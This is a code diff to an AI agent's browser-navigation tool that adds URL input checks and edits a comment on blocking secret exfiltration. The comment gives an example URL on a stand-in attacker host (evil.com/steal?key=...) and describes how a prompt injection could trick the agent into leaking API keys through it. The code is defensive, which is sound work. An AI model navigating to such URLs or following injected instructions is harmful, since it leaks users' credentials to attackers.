@@ -2813,9 +2813,22 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     Returns:
         JSON string with navigation result (includes stealth features info on first nav)
     """
+    if not isinstance(url, str):
+        return json.dumps({
+            "success": False,
+            "error": "Expected string URL; URL must be non-empty",
+        })
+
+    url = url.strip()
+    if not url:
+        return json.dumps({
+            "success": False,
+            "error": "URL must not be empty",
+        })
+
     # Secret exfiltration protection — block URLs that embed API keys or
     # tokens in query parameters. A prompt injection could trick the agent
-    # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
+    # into navigating to https://evil.com/steal?key=*** to exfil secrets.
     # Also check URL-decoded form to catch %2D encoding tricks (e.g. sk%2Dant%2D...).
     import urllib.parse
     from agent.redact import _PREFIX_RE
